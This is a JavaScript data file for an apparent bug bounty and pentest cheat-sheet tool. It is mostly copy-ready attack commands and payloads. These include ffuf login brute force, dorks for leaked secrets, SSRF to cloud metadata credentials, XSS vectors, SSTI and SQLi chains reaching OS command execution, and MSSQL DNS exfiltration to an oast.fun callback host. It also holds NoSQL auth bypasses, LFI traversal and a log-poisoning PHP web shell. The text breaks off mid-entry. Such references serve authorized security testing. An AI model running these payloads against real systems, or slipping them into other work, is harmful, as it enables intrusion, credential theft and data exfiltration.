// Curated payload/command reference. Standard, widely-published techniques —
// the same material PayloadsAllTheThings / HackTricks / GTFOBins already
// cover, cross-checked against those sources, embedded here with search,
// filtering and one-click copy.
const CS_TRACKS = {
  bugbounty: {
    label: 'Bug Bounty',
    intro: 'Grouped by vulnerability class and business impact — what you\'d actually chase for a report.',
    categories: [
      { id: 'recon-enum', label: 'Recon & Fuzzing' },
      { id: 'dorks', label: 'Google Dorks' },
      { id: 'ssrf', label: 'SSRF' },
      { id: 'xss', label: 'XSS' },
      { id: 'ssti', label: 'SSTI' },
      { id: 'sqli', label: 'SQLi' },
      { id: 'nosql', label: 'NoSQL Injection' },
      { id: 'lfi', label: 'LFI / RFI' },
      { id: 'xxe', label: 'XXE' },
      { id: 'command-injection', label: 'Command Injection' },
      { id: 'ldap-injection', label: 'LDAP Injection' },
      { id: 'csrf', label: 'CSRF' },
      { id: 'cors', label: 'CORS' },
      { id: 'idor-oauth', label: 'IDOR / OAuth / ATO' },
      { id: 'jwt', label: 'JWT' },
      { id: 'open-redirect', label: 'Open Redirect' },
      { id: 'graphql', label: 'GraphQL' },
      { id: 'proto-pollution', label: 'Prototype Pollution' },
      { id: 'deserialization', label: 'Insecure Deserialization' },
      { id: 'request-smuggling', label: 'Request Smuggling' },
      { id: 'race-condition', label: 'Race Condition' },
      { id: 'cache-poisoning', label: 'Cache Poisoning' },
      { id: 'file-upload', label: 'File Upload' },
      { id: 'subdomain-takeover', label: 'Subdomain Takeover' },
      { id: 'cloud', label: 'Cloud / AWS' },
      { id: 'clickjacking', label: 'Clickjacking' },
      { id: 'crlf', label: 'CRLF Injection' },
      { id: 'http-param-pollution', label: 'HTTP Parameter Pollution' },
      { id: 'mass-assignment', label: 'Mass Assignment' },
      { id: 'info-disclosure', label: 'Information Disclosure' },
      { id: 'host-header', label: 'Host Header Injection' },
      { id: 'xpath-injection', label: 'XPath Injection' },
      { id: 'api-security', label: 'API Security' },
      { id: 'waf-bypass', label: 'WAF Bypass' }
    ]
  },
  pentesting: {
    label: 'Pentesting',
    intro: 'Grouped by system and engagement phase — what you\'d reach for on an internal box or a domain.',
    categories: [
      { id: 'enumeration', label: 'Enumeration' },
      { id: 'common-ports', label: 'Exploitable Ports' },
      { id: 'wordpress', label: 'WordPress' },
      { id: 'linux-privesc', label: 'Linux Privesc' },
      { id: 'windows-privesc', label: 'Windows Privesc' },
      { id: 'active-directory', label: 'Active Directory' },
      { id: 'mimikatz', label: 'Mimikatz' },
      { id: 'password-attacks', label: 'Password Attacks' },
      { id: 'lateral-movement', label: 'Lateral Movement' },
      { id: 'impacket', label: 'Impacket Suite' },
      { id: 'path-hijacking', label: 'PATH Hijacking' },
      { id: 'containers-k8s', label: 'Containers / K8s' },
      { id: 'web-shells', label: 'Web Shells' },
      { id: 'file-transfer', label: 'File Transfer' },
      { id: 'port-forwarding', label: 'Port Forwarding' },
      { id: 'persistence', label: 'Persistence' },
      { id: 'mitm', label: 'ARP Spoofing / MITM' },
      { id: 'wifi', label: 'WiFi Hacking' }
    ]
  }
};

const CS_CARDS = [
  // ================= BUG BOUNTY =================

  // ---------- recon-enum ----------
  // Real workflows, not invented ones — cross-checked against public bug
  // bounty methodology writeups and the SecLists / Assetnote / Kiterunner docs.
  { track:'bugbounty', cat:'recon-enum', title:'Recursive content discovery',
    code:'ffuf -u https://{DOMAIN}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -recursion -recursion-depth 2 -e .php,.json,.bak -mc 200,204,301,302,307,401,403 -fs 0',
    note:'The standard "serious" ffuf run: raft-large for real coverage, -recursion to auto-dive into found directories, common extensions appended, and -fs 0 filtering nothing by size until you\'ve seen the baseline — tighten -fc/-fs once you know what the default 404 looks like.' },
  { track:'bugbounty', cat:'recon-enum', title:'VHost / subdomain fuzzing via Host header',
    code:'ffuf -u https://{DOMAIN}/ -H "Host: FUZZ.{DOMAIN}" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <baseline-size>',
    note:'Finds virtual hosts that share the same IP as the main site but never show up in DNS enumeration — always send one throwaway request first to learn the "not found" response size, then filter it out with -fs.' },
  { track:'bugbounty', cat:'recon-enum', title:'Hidden GET parameter discovery',
    code:'ffuf -u https://{DOMAIN}/endpoint?FUZZ=test -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200 -fs <baseline-size>',
    note:'Surfaces undocumented parameters (debug=1, admin=true, format=xml...) that change server behavior even though they\'re never in the docs — a classic way into hidden functionality and IDOR/SSRF sinks.' },
  { track:'bugbounty', cat:'recon-enum', title:'Assetnote wordlists (updated monthly)',
    code:'curl -s https://wordlists.assetnote.io/data/manual/httparchive_directories_1m_2025_01_28.txt -o directories.txt',
    note:'SecLists is a great baseline but goes stale; Assetnote regenerates its lists monthly from fresh internet-wide crawl data, which is why most top bug bounty hunters keep both and reach for Assetnote first on modern stacks.' },
  { track:'bugbounty', cat:'recon-enum', title:'Kiterunner for API endpoint discovery',
    code:'kr scan https://api.{DOMAIN} -w routes-large.kite -x 20',
    note:'ffuf treats every path as a flat GET request; Kiterunner (also by Assetnote) replays full API-shaped requests — correct methods, headers, content-types — from real captured API schemas, so it finds routes ffuf\'s wordlists never will.' },
  { track:'bugbounty', cat:'recon-enum', title:'POST body / login form fuzzing',
    code:'ffuf -u https://{DOMAIN}/login -X POST -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -w rockyou.txt -fc 401',
    note:'Same tool, aimed at a login endpoint instead of the URL path — -fc 401 filters out the expected "wrong password" response so only anomalies (200, 500, a slower timing) surface in the results.' },
  { track:'bugbounty', cat:'recon-enum', title:'Zone transfer attempt (AXFR)',
    code:'dig NS {DOMAIN} +short\ndig axfr {DOMAIN} @ns1.{DOMAIN}',
    note:'First list the target\'s own nameservers, then try a transfer against each one — almost always refused on a properly configured public DNS server, but costs nothing to try and occasionally hands over the entire zone.' },
  { track:'bugbounty', cat:'recon-enum', title:'Dump every record type at once',
    code:'dig {DOMAIN} ANY +noall +answer',
    note:'A quick one-shot pass before querying types individually — many modern resolvers ignore ANY, so treat it as a bonus, not something to rely on.' },
  { track:'bugbounty', cat:'recon-enum', title:'Fingerprint mail & third-party services',
    code:'dig MX {DOMAIN} +short\ndig TXT {DOMAIN} +short',
    note:'MX records name the mail provider, and TXT records routinely contain SPF/DMARC entries and domain-verification strings for cloud services (Google, Stripe, Salesforce...) — a fast way to map what third-party stack the target actually runs on.' },
  { track:'bugbounty', cat:'recon-enum', title:'DNS-based subdomain brute-force',
    code:'while read sub; do dig +short "$sub.{DOMAIN}" | grep -q . && echo "$sub.{DOMAIN}"; done < /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt',
    note:'The dependency-free version of what subfinder/amass automate — useful for a quick manual check, or to sanity-check what those tools are actually finding.' },
  { track:'bugbounty', cat:'recon-enum', title:'Gobuster directory brute-force',
    code:'gobuster dir -u https://{DOMAIN} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,json,bak -t 50',
    note:'The Go-based alternative to ffuf — fewer knobs to turn, fast by default, and often the first tool reached for before switching to ffuf when you need real filtering logic (-fs, -fc, recursion).' },
  { track:'bugbounty', cat:'recon-enum', title:'Gobuster subdomain enumeration (DNS mode)',
    code:'gobuster dns -d {DOMAIN} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50',
    note:'Brute-forces subdomains by resolving each wordlist entry directly against DNS — no HTTP requests at all, so it\'s fast and works even for subdomains that don\'t serve a website.' },
  { track:'bugbounty', cat:'recon-enum', title:'Gobuster virtual host discovery',
    code:'gobuster vhost -u https://{DOMAIN} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain',
    note:'Same idea as the ffuf Host-header fuzzing above, purpose-built into gobuster — finds vhosts sharing the same IP as the main site that never show up in DNS enumeration.' },
  { track:'bugbounty', cat:'recon-enum', title:'Gobuster S3 bucket enumeration',
    code:'gobuster s3 --wordlist bucket-names.txt',
    note:'Brute-forces S3 bucket names directly against AWS — seed the wordlist with permutations of the company/product name ({DOMAIN} without the TLD, common suffixes like -backup, -dev, -assets) since bucket names are global and guessable ones get squatted fast.' },

  // ---------- dorks ----------
  // Sourced from TakSec/google-dorks-bug-bounty (github.com/TakSec/google-dorks-bug-bounty),
  // one of the most-cited real dork collections in the bug bounty community —
  // not invented, just templated with {DOMAIN} and given a plain-English note each.
  { track:'bugbounty', cat:'dorks', title:'Broad domain search (negative filter)',
    code:'site:{DOMAIN} -www -shop -share -ir -mfa',
    note:'Excludes the usual noisy subdomains (marketing site, shop, investor relations, MFA portal) to surface less obvious indexed subdomains and paths first.' },
  { track:'bugbounty', cat:'dorks', title:'PHP pages with parameters',
    code:'site:{DOMAIN} ext:php inurl:?',
    note:'Finds PHP pages that take URL parameters — the highest-value starting point for injection testing, since static pages with no params rarely are vulnerable to much.' },
  { track:'bugbounty', cat:'dorks', title:'API endpoints',
    code:'site:{DOMAIN} inurl:api | site:*/rest | site:*/v1 | site:*/v2 | site:*/v3',
    note:'Surfaces indexed API routes and versioned endpoints Google has crawled — often reveals older API versions still live and less hardened than the current one.' },
  { track:'bugbounty', cat:'dorks', title:'Juicy file extensions',
    code:'site:"{DOMAIN}" ext:log | ext:txt | ext:conf | ext:cnf | ext:ini | ext:env | ext:sh | ext:bak | ext:backup | ext:swp | ext:old | ext:~ | ext:git | ext:svn | ext:htpasswd | ext:htaccess | ext:json',
    note:'Casts a wide net for backup/config/log files that were never meant to be public — .env and .git hits especially often contain hardcoded credentials.' },
  { track:'bugbounty', cat:'dorks', title:'High-value inurl keywords',
    code:'inurl:conf | inurl:env | inurl:cgi | inurl:bin | inurl:etc | inurl:root | inurl:sql | inurl:backup | inurl:admin | inurl:php site:{DOMAIN}',
    note:'A grab-bag of path keywords that disproportionately show up in real disclosed reports — cheap to run, worth doing early.' },
  { track:'bugbounty', cat:'dorks', title:'Indexed server errors',
    code:'inurl:"error" | intitle:"exception" | intitle:"failure" | intitle:"server at" | inurl:exception | "database error" | "SQL syntax" | "undefined index" | "unhandled exception" | "stack trace" site:{DOMAIN}',
    note:'Finds pages Google indexed mid-crash — stack traces and SQL errors routinely leak internal file paths, framework versions, and query structure.' },
  { track:'bugbounty', cat:'dorks', title:'XSS-prone parameters',
    code:'inurl:q= | inurl:s= | inurl:search= | inurl:query= | inurl:keyword= | inurl:lang= inurl:& site:{DOMAIN}',
    note:'Search/query-style parameters get reflected back into the page far more often than not — a strong first list to manually test with an XSS payload.' },
  { track:'bugbounty', cat:'dorks', title:'Open redirect-prone parameters',
    code:'inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inurl:ret= | inurl:r2= | inurl:page= inurl:& inurl:http site:{DOMAIN}',
    note:'Parameter names that commonly drive a post-login or post-action redirect — swap the value for an external URL and see if it\'s validated.' },
  { track:'bugbounty', cat:'dorks', title:'SQLi-prone parameters',
    code:'inurl:id= | inurl:pid= | inurl:category= | inurl:cat= | inurl:action= | inurl:sid= | inurl:dir= inurl:& site:{DOMAIN}',
    note:'Numeric ID-style parameters that usually feed straight into a database query — the classic SQLi starting point.' },
  { track:'bugbounty', cat:'dorks', title:'SSRF-prone parameters',
    code:'inurl:http | inurl:url= | inurl:path= | inurl:dest= | inurl:html= | inurl:data= | inurl:domain= | inurl:page= inurl:& site:{DOMAIN}',
    note:'Parameters that take a URL or path as input are exactly what a server-side fetch feature looks like — prime SSRF candidates.' },
  { track:'bugbounty', cat:'dorks', title:'LFI-prone parameters',
    code:'inurl:include | inurl:dir | inurl:detail= | inurl:file= | inurl:folder= | inurl:inc= | inurl:locate= | inurl:doc= | inurl:conf= inurl:& site:{DOMAIN}',
    note:'Parameters that name a file or folder directly are the textbook LFI/path traversal entry point.' },
  { track:'bugbounty', cat:'dorks', title:'RCE-prone parameters',
    code:'inurl:cmd | inurl:exec= | inurl:query= | inurl:code= | inurl:do= | inurl:run= | inurl:read= | inurl:ping= inurl:& site:{DOMAIN}',
    note:'Parameters that sound like they trigger a server-side action (ping, exec, run) are worth checking for command injection first.' },
  { track:'bugbounty', cat:'dorks', title:'File upload endpoints',
    code:'site:{DOMAIN} intext:"choose file" | intext:"select file" | intext:"upload PDF"',
    note:'Finds indexed pages with a file upload form — feeds straight into the File Upload payloads elsewhere on this page.' },
  { track:'bugbounty', cat:'dorks', title:'API docs (Swagger/OpenAPI)',
    code:'inurl:apidocs | inurl:api-docs | inurl:swagger | inurl:api-explorer | inurl:redoc | inurl:openapi | intitle:"Swagger UI" site:"{DOMAIN}"',
    note:'An indexed Swagger/OpenAPI doc is basically a free map of the entire API surface, params included — always worth finding before you start guessing endpoints.' },
  { track:'bugbounty', cat:'dorks', title:'Login pages',
    code:'inurl:login | inurl:signin | intitle:login | intitle:signin | inurl:secure site:{DOMAIN}',
    note:'Maps every discoverable login surface — useful for scoping credential attacks and for just knowing how many separate auth systems the target actually runs.' },
  { track:'bugbounty', cat:'dorks', title:'Test / staging environments',
    code:'inurl:test | inurl:env | inurl:dev | inurl:staging | inurl:sandbox | inurl:debug | inurl:temp | inurl:internal | inurl:demo site:{DOMAIN}',
    note:'Non-production environments get indexed far more often than they should, and are routinely far less hardened than the real site — huge bang for buck.' },
  { track:'bugbounty', cat:'dorks', title:'Sensitive documents',
    code:'site:{DOMAIN} ext:txt | ext:pdf | ext:xml | ext:xls | ext:xlsx | ext:ppt | ext:pptx | ext:doc | ext:docx\nintext:"confidential" | intext:"Not for Public Release" | intext:"internal use only" | intext:"do not distribute"',
    note:'Combines a document-type filter with language that only appears on documents someone explicitly didn\'t want public.' },
  { track:'bugbounty', cat:'dorks', title:'Sensitive parameters (PII-shaped)',
    code:'inurl:email= | inurl:phone= | inurl:name= | inurl:user= inurl:& site:{DOMAIN}',
    note:'PII-shaped parameter names — worth checking for IDOR (swap the value for someone else\'s) as much as for direct exposure.' },
  { track:'bugbounty', cat:'dorks', title:'Adobe Experience Manager (AEM)',
    code:'inurl:/content/usergenerated | inurl:/content/dam | inurl:/jcr:content | inurl:/libs/granite | inurl:/etc/clientlibs | inurl:/content/geometrixx | inurl:/bin/wcm | inurl:/crx/de site:{DOMAIN}',
    note:'AEM-specific paths — /crx/de in particular is a full content repository browser that\'s shockingly often left open on real AEM deployments.' },
  { track:'bugbounty', cat:'dorks', title:'Disclosed reports on OpenBugBounty',
    code:'site:openbugbounty.org inurl:reports intext:"{DOMAIN}"',
    note:'OpenBugBounty publishes disclosed (and sometimes still-unfixed) XSS/redirect reports against real domains — check whether the target already has a public history before you start from zero.' },
  { track:'bugbounty', cat:'dorks', title:'Google Groups leaks',
    code:'site:groups.google.com "{DOMAIN}"',
    note:'Internal mailing-list discussions occasionally leak into public Google Groups — worth a quick look for anything an employee assumed was private.' },
  { track:'bugbounty', cat:'dorks', title:'Code leak sites (Pastebin, JSFiddle, CodeBeautify, CodePen)',
    code:'site:pastebin.com "{DOMAIN}"\nsite:jsfiddle.net "{DOMAIN}"\nsite:codebeautify.org "{DOMAIN}"\nsite:codepen.io "{DOMAIN}"',
    note:'Developers paste real code, API calls, and sometimes live keys into these sites while debugging — a fast sweep across the platforms devs actually use for that.' },
  { track:'bugbounty', cat:'dorks', title:'Exposed cloud storage',
    code:'site:s3.amazonaws.com "{DOMAIN}"\nsite:blob.core.windows.net "{DOMAIN}"\nsite:googleapis.com "{DOMAIN}"\nsite:drive.google.com "{DOMAIN}"\nsite:dev.azure.com "{DOMAIN}"\nsite:onedrive.live.com "{DOMAIN}"\nsite:digitaloceanspaces.com "{DOMAIN}"\nsite:sharepoint.com "{DOMAIN}"\nsite:dropbox.com/s "{DOMAIN}"\nsite:docs.google.com inurl:"/d/" "{DOMAIN}"',
    note:'One dork per major cloud storage provider — finds S3 buckets, Azure blobs, Drive files and SharePoint docs that mention the target and were indexed publicly, meaning they were misconfigured as public in the first place.' },
  { track:'bugbounty', cat:'dorks', title:'JFrog Artifactory exposure',
    code:'site:jfrog.io "{DOMAIN}"',
    note:'Exposed Artifactory instances often leak internal build artifacts, and sometimes credentials baked into them.' },
  { track:'bugbounty', cat:'dorks', title:'Firebase exposure',
    code:'site:firebaseio.com "{DOMAIN}"',
    note:'An indexed Firebase database URL is worth checking directly — misconfigured rules on Firebase Realtime Database are still extremely common and often allow unauthenticated read/write.' },
  { track:'bugbounty', cat:'dorks', title:'VDP / bug bounty program discovery (no domain needed)',
    code:'"submit vulnerability report" | "powered by bugcrowd" | "powered by hackerone"\nsite:*/security.txt "bounty"',
    note:'Finds programs directly rather than testing one you already know about — including private or unlisted programs referenced in a company\'s own security.txt.' },
  { track:'bugbounty', cat:'dorks', title:'Exposed Apache server-status',
    code:'site:*/server-status apache',
    note:'A world-readable mod_status page leaks live request info: internal IPs, URLs currently being served, and sometimes session identifiers sitting in the query string.' },
  { track:'bugbounty', cat:'dorks', title:'CMS fingerprint dorks (WordPress/Drupal/Joomla)',
    code:'inurl:/wp-admin/admin-ajax.php\nintext:"Powered by" & intext:Drupal & inurl:user\nsite:*/joomla/login',
    note:'Quick fingerprinting dorks for the three most common CMSes — confirms the stack before reaching for CMS-specific tooling (WPScan etc.) elsewhere on this page.' },
  { track:'bugbounty', cat:'dorks', title:'Open directory listing',
    code:'intext:"index of" "parent directory" site:{DOMAIN}',
    note:'Catches misconfigured web servers that render a raw file listing instead of an index page — often the fastest way to see a target\'s entire file tree at once, backups and all.' },
  { track:'bugbounty', cat:'dorks', title:'Exposed admin/monitoring panels (Jenkins, Grafana, Kibana)',
    code:'intitle:"Dashboard [Jenkins]" site:{DOMAIN}\nintitle:"Grafana" inurl:":3000" inurl:"/d/" site:{DOMAIN}\nintitle:"Kibana" inurl:":5601/app/kibana" site:{DOMAIN}',
    note:'CI/CD and observability dashboards are built for internal use and routinely deployed with no auth in front of them — Jenkins in particular usually means "build a job that runs a reverse shell" if it\'s unauthenticated.' },
  { track:'bugbounty', cat:'dorks', title:'Exposed database admin panels',
    code:'intitle:"phpMyAdmin" inurl:"/phpmyadmin" site:{DOMAIN}\nintitle:"Adminer" inurl:"adminer.php" site:{DOMAIN}',
    note:'A reachable phpMyAdmin/Adminer instance is often one weak or default credential away from full database access — worth a quick default-creds check the moment you find one.' },
  { track:'bugbounty', cat:'dorks', title:'phpinfo() disclosure',
    code:'inurl:"phpinfo.php" | inurl:"info.php" site:{DOMAIN}',
    note:'A leftover phpinfo() page dumps the full server environment — PHP version, loaded extensions, file paths, and sometimes environment variables that were never meant to be public.' },
  { track:'bugbounty', cat:'dorks', title:'Trello & Postman leaks',
    code:'site:trello.com "{DOMAIN}"\nsite:documenter.getpostman.com "{DOMAIN}"',
    note:'Public Trello boards leak roadmaps, credentials and internal URLs left in card descriptions; published Postman collections are effectively a full API map, auth headers and all, if someone forgot to scrub them before sharing.' },
  { track:'bugbounty', cat:'dorks', title:'Secrets on GitHub/GitLab',
    code:'site:github.com "{DOMAIN}" password | secret | api_key | api_token\nsite:gitlab.com "{DOMAIN}" password | secret | api_key',
    note:'A basic starting search before reaching for dedicated tooling (GitDorker, trufflehog, gitleaks) — code search still regularly turns up hardcoded credentials committed by accident, even in public repos unrelated to the company itself.' },

  // ---------- ssrf ----------
  { track:'bugbounty', cat:'ssrf', title:'AWS IMDS metadata (IMDSv1)',
    code:'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    note:'If the SSRF can reach this and IMDSv2 isn\'t enforced, the response lists the attached IAM role name. Append it to the URL to get temporary AWS access keys — the classic SSRF-to-cloud-credential chain.' },
  { track:'bugbounty', cat:'ssrf', title:'GCP metadata (needs a header)',
    code:'curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
    note:'GCP\'s metadata service refuses requests without this header, so it only works if the vulnerable app lets you control request headers, not just the URL.' },
  { track:'bugbounty', cat:'ssrf', title:'Blind SSRF via OOB interaction',
    code:'http://YOUR-ID.oast.fun/ssrf-test',
    note:'For SSRF that never reflects a response, point the vulnerable parameter at a Burp Collaborator / interactsh domain and watch for a DNS or HTTP callback — that alone confirms the request fired server-side.' },
  { track:'bugbounty', cat:'ssrf', title:'Decimal-IP filter bypass',
    code:'http://2130706433/   (= 127.0.0.1)',
    note:'Blocklists that only match the literal string "127.0.0.1" or "localhost" miss alternate encodings: decimal IP, octal (0177.0.0.1), IPv6 ([::1]), or a domain you control that resolves to 127.0.0.1.' },
  { track:'bugbounty', cat:'ssrf', title:'Gopher to internal Redis',
    code:'gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A',
    note:'Gopher lets an SSRF send raw bytes to a non-HTTP internal service — this example sends a raw Redis FLUSHALL command. Useful for reaching services with no HTTP interface at all.' },
  { track:'bugbounty', cat:'ssrf', title:'DNS rebinding bypass',
    code:'make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms',
    note:'This domain resolves to a normal, allow-listed IP on the first DNS lookup and to 169.254.169.254 on the next — the validator checks one address, the HTTP client connects to another.' },
  { track:'bugbounty', cat:'ssrf', title:'URL parser confusion',
    code:'http://127.1.1.1:80\\@127.2.2.2:80/',
    note:'Different URL parsers disagree about what\'s the host and what\'s userinfo before the @ — a validator can approve 127.1.1.1 while the actual HTTP client connects to 127.2.2.2.' },
  { track:'bugbounty', cat:'ssrf', title:'Redirect-based bypass',
    code:'https://307.r3dir.me/--to/?url=http://169.254.169.254/',
    note:'If the filter only checks the first request and the app follows redirects, a 307/308 redirect from an allow-listed host preserves the method and body while landing on the real target.' },
  { track:'bugbounty', cat:'ssrf', title:'Azure IMDS metadata',
    code:"curl -H 'Metadata:true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'",
    note:'Azure\'s equivalent of the AWS/GCP metadata service — also gated behind a specific header, and can hand back a managed identity access token the same way AWS IMDS hands back IAM credentials.' },
  { track:'bugbounty', cat:'ssrf', title:'SSRF via URL-fetching features',
    code:'PDF-from-webpage / link-preview / webhook-tester -> point it at http://169.254.169.254/latest/meta-data/',
    note:'Any feature that fetches a URL server-side on your behalf — PDF renderers, link previews, webhook testers, image proxies — is a potential SSRF entry point, often overlooked because it doesn\'t look like a typical API parameter.' },
  { track:'bugbounty', cat:'ssrf', title:'IPv6-mapped IPv4 bypass',
    code:'http://[0:0:0:0:0:ffff:127.0.0.1]/',
    note:'Blocklists that only pattern-match the IPv4 string "127.0.0.1" miss its IPv6-mapped equivalent — many HTTP clients still resolve and connect to it as localhost regardless.' },

  // ---------- xss ----------
  { track:'bugbounty', cat:'xss', title:'Baseline reflected',
    code:'<script>alert(document.domain)</script>',
    note:'The starting point for any XSS test — confirms script execution and shows exactly which origin it fired on, which matters once you chain it into something with real impact.' },
  { track:'bugbounty', cat:'xss', title:'No-<script>-tag bypass',
    code:'<img src=x onerror=alert(1)>',
    note:'Works anywhere <script> gets stripped but other tags don\'t — the browser tries to load "x" as an image, fails, and runs onerror instead.' },
  { track:'bugbounty', cat:'xss', title:'SVG vector',
    code:'<svg onload=alert(1)>',
    note:'onload fires as soon as the element renders, with zero user interaction — useful when filters block img/script but allow svg.' },
  { track:'bugbounty', cat:'xss', title:'Short attribute-breakout polyglot',
    code:'"><svg/onload=alert(1)>',
    note:'Closes a double-quoted HTML attribute first, then drops a self-contained SVG payload — covers two common injection contexts with one string.' },
  { track:'bugbounty', cat:'xss', title:'DOM XSS via location.hash',
    code:'https://target.com/page#<img src=x onerror=alert(1)>',
    note:'If client-side JS reads location.hash into innerHTML (a common DOM sink), the payload never even reaches the server — test it directly in the URL bar.' },
  { track:'bugbounty', cat:'xss', title:'AngularJS sandbox escape (CSTI)',
    code:"{{constructor.constructor('alert(1)')()}}",
    note:'In old AngularJS versions (<1.6), expressions inside {{ }} run in a JS sandbox that this payload escapes entirely by reaching the Function constructor — client-side template injection, the DOM-side sibling of SSTI.' },
  { track:'bugbounty', cat:'xss', title:'DOM clobbering',
    code:'<img name=body>',
    note:'A named/id\'d HTML element can silently overwrite a global JS variable like window.body — if vulnerable code later trusts that variable as an object or DOM node, this shapes its behavior with pure HTML, no script execution needed to plant it.' },
  { track:'bugbounty', cat:'xss', title:'javascript: URI (non-script sinks)',
    code:'<a href="javascript:alert(1)">click</a>',
    note:'Works when the injection point is an href/src attribute rather than raw HTML — many filters focus on <script> tags and on* handlers and miss the javascript: URI scheme entirely.' },

  // ---------- ssti ----------
  { track:'bugbounty', cat:'ssti', title:'Universal detection probe',
    code:'{{7*7}}',
    note:'If the response renders 49 instead of the literal string, the input is being evaluated as a template. Also try ${7*7} and #{7*7} — detection syntax differs per engine.' },
  { track:'bugbounty', cat:'ssti', title:'Jinja2 / Flask RCE',
    code:"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}",
    note:'Walks Python\'s object graph from a template context object back up to __builtins__ to reach import os — the classic Jinja2 sandbox-escape chain.' },
  { track:'bugbounty', cat:'ssti', title:'Freemarker RCE',
    code:'<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}',
    note:'Freemarker exposes a utility class that invokes arbitrary system commands directly from the template language — no sandbox escape needed.' },
  { track:'bugbounty', cat:'ssti', title:'Twig RCE (PHP)',
    code:"{{['id']|filter('system')}}",
    note:'Abuses Twig\'s filter function to pass the array element straight into PHP\'s system().' },
  { track:'bugbounty', cat:'ssti', title:'Pug/Jade RCE (Node.js)',
    code:"#{ process.mainModule.require('child_process').execSync('id') }",
    note:'Pug templates run inside Node, so reaching require() from the expression context gives full RCE the same way Jinja2\'s __builtins__ chain does for Python.' },
  { track:'bugbounty', cat:'ssti', title:'ERB RCE (Ruby)',
    code:"<%= system('id') %>",
    note:'If user input reaches an ERB template directly (common in some Rails misconfigurations or static-site generators), this is a one-line RCE.' },

  // ---------- sqli ----------
  { track:'bugbounty', cat:'sqli', title:'Auth bypass',
    code:"' OR '1'='1' -- -",
    note:'Turns the WHERE clause into an always-true condition, logging in as the first matched user without knowing a password.' },
  { track:'bugbounty', cat:'sqli', title:'Column count for UNION',
    code:"' ORDER BY 10-- -",
    note:'Increment the number until the query errors — the last value that still succeeds tells you how many columns the original SELECT returns, which UNION SELECT has to match exactly.' },
  { track:'bugbounty', cat:'sqli', title:'UNION-based extraction',
    code:"' UNION SELECT username, password, 3 FROM users-- -",
    note:'Once the column count and a text-rendered column position are known, UNION SELECT pulls arbitrary table data straight into the page\'s normal output.' },
  { track:'bugbounty', cat:'sqli', title:'Time-based blind',
    code:"' OR IF(1=1, SLEEP(5), 0)-- -",
    note:'For injections with no visible output at all, a deliberate delay is the only signal — a 5-second response confirms the condition evaluated true, character by character if needed.' },
  { track:'bugbounty', cat:'sqli', title:'Error-based extraction (MySQL)',
    code:"' AND extractvalue(1, concat(0x7e, (SELECT version())))-- -",
    note:'Deliberately throws an XPath error that embeds the subquery\'s result in the error message MySQL returns — fast extraction when verbose errors reach the response.' },
  { track:'bugbounty', cat:'sqli', title:'Boolean-based blind',
    code:"' AND SUBSTRING(database(),1,1)='a",
    note:'For blind SQLi with no errors and no timing needed, a true/false difference in the page (e.g. "Welcome" vs nothing) lets you extract data character by character by testing each position.' },
  { track:'bugbounty', cat:'sqli', title:'MSSQL command execution',
    code:"'; EXEC xp_cmdshell 'whoami'; --",
    note:'If xp_cmdshell is enabled (or re-enabled via sp_configure with sysadmin rights), stacked queries on SQL Server give direct OS command execution, not just data extraction.' },
  { track:'bugbounty', cat:'sqli', title:'PostgreSQL RCE via COPY TO PROGRAM',
    code:"'; COPY (SELECT '') TO PROGRAM 'id'; --",
    note:'PostgreSQL\'s COPY ... TO PROGRAM runs an OS command as the database process — a lesser-known RCE path when SQLi lands against a Postgres backend with sufficient privileges.' },
  { track:'bugbounty', cat:'sqli', title:'OOB exfiltration via DNS (MSSQL)',
    code:"'; EXEC master..xp_dirtree '\\\\YOUR-ID.oast.fun\\a'; --",
    note:'Forces the SQL Server process to perform a DNS/SMB lookup against a domain you control — a reliable out-of-band channel for blind SQLi even when there\'s no output or timing signal to work with.' },

  // ---------- nosql ----------
  { track:'bugbounty', cat:'nosql', title:'MongoDB auth bypass ($ne)',
    code:'{"username": {"$ne": null}, "password": {"$ne": null}}',
    note:'Exploits the "not equal" operator to match any document where both fields simply exist and aren\'t null, bypassing credential validation entirely.' },
  { track:'bugbounty', cat:'nosql', title:'MongoDB auth bypass ($gt)',
    code:'{"username": {"$gt": ""}, "password": {"$gt": ""}}',
    note:'"Greater than empty string" matches lexicographically against any non-empty value — same effect as $ne, different operator, worth trying if one gets filtered.' },
  { track:'bugbounty', cat:'nosql', title:'Blind extraction via $regex',
    code:'{"username": {"$eq": "admin"}, "password": {"$regex": "^m"}}',
    note:'Tests the password one prefix at a time (^m, ^ma, ^mar...) — a different response for a matching vs non-matching regex lets you reconstruct the value character by character.' },

  // ---------- lfi ----------
  { track:'bugbounty', cat:'lfi', title:'Basic traversal',
    code:'../../../../../../../../etc/passwd',
    note:'Stack enough ../ to escape the web root regardless of how deep the target file actually lives — extra sequences are harmless if you overshoot.' },
  { track:'bugbounty', cat:'lfi', title:'PHP filter chain (source disclosure)',
    code:'php://filter/convert.base64-encode/resource=index.php',
    note:'Wraps the target file through PHP\'s base64 filter instead of executing it, so you get the raw source back instead of a fatal parse error — essential for reading .php files through an LFI.' },
  { track:'bugbounty', cat:'lfi', title:'Log poisoning to RCE',
    code:"User-Agent: <?php system($_GET['c']); ?>\nthen: ...&file=/var/log/apache2/access.log&c=id",
    note:'Plant PHP in a header that gets logged verbatim, then use the LFI to include the log file — the planted code executes once the log is parsed as PHP.' },
  { track:'bugbounty', cat:'lfi', title:'Null byte (legacy PHP < 5.3.4)',
    code:'../../../etc/passwd%00',
